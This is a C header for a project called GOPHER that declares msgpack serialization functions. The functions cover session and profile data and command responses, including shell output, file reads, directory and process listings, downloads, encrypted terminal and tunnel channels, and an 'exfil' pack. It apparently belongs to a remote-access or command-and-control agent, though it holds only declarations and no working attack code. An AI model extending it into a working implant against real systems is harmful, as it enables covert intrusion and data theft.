//
// Created by seba on 10/17/26.
//

#ifndef GOPHER_PACK_H
#define GOPHER_PACK_H

#include "common.h"
#include "profile.h"

// Unpack a msgpack blob into a Profile struct. Caller must free the strings/byte arrays inside with profile_free().
int  pack_decode_profile(const uint8_t *data, size_t len, Profile *out);
void profile_free(Profile *p);

// Pack SessionInfo into msgpack. Caller must free(*out).
int  pack_encode_session_info(const SessionInfo *info, uint8_t **out, size_t *out_len);

// Pack InitPack into msgpack. Caller must free(*out).
int  pack_encode_init_pack(const InitPack *ip, uint8_t **out, size_t *out_len);

// Pack StartMsg into msgpack. Caller must free(*out).
int  pack_encode_start_msg(const StartMsg *sm, uint8_t **out, size_t *out_len);

// Pack Message into msgpack. Caller must free(*out).
int  pack_encode_message(const Message *msg, uint8_t **out, size_t *out_len);

// Unpack a msgpack blob into a Message struct. Caller must free objects/object_lens with message_free().
int  pack_decode_message(const uint8_t *data, size_t len, Message *out);
void message_free(Message *msg);

// Unpack a msgpack blob into a Command struct. Caller must free data with command_free().
int  pack_decode_command(const uint8_t *data, size_t len, Command *out);
void command_free(Command *cmd);

// Pack Command into msgpack (for response). Caller must free(*out).
int  pack_encode_command(const Command *cmd, uint8_t **out, size_t *out_len);

// Response type encoders. Caller must free(*out).
int  pack_encode_error(const char *error, uint8_t **out, size_t *out_len);
int  pack_encode_pwd(const char *path, uint8_t **out, size_t *out_len);
int  pack_encode_shell(const char *output, uint8_t **out, size_t *out_len);
int  pack_encode_cat(const char *path, const uint8_t *content, size_t content_len, uint8_t **out, size_t *out_len);
int  pack_encode_ls(bool result, const char *status, const char *path, const uint8_t *files, size_t files_len, uint8_t **out, size_t *out_len);
int  pack_encode_ps(bool result, const char *status, const uint8_t *procs, size_t procs_len, uint8_t **out, size_t *out_len);

int  pack_encode_exfil_pack(uint32_t id, uint32_t type, const char *task, uint8_t **out, size_t *out_len);

int  pack_encode_job(uint32_t command_id, const char *job_id, const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);

int  pack_encode_ans_download(int file_id, const char *path, int size, const uint8_t *content, size_t content_len,
     bool start, bool finish, bool canceled, uint8_t **out, size_t *out_len);

int  pack_encode_ans_run(const char *stdout_str, size_t stdout_len, const char *stderr_str, size_t stderr_len,
     int pid, bool start, bool finish, uint8_t **out, size_t *out_len);

int  pack_encode_ans_job_list(const uint8_t *list_data, size_t list_len, uint8_t **out, size_t *out_len);

int  pack_encode_term_pack(uint32_t id, int term_id, const uint8_t *key, const uint8_t *iv, bool alive, const char *status, uint8_t **out, size_t *out_len);

int  pack_encode_tunnel_pack(uint32_t id, uint32_t type, int channel_id, const uint8_t *key, const uint8_t *iv,
     bool alive, uint8_t reason, uint8_t **out, size_t *out_len);

#endif
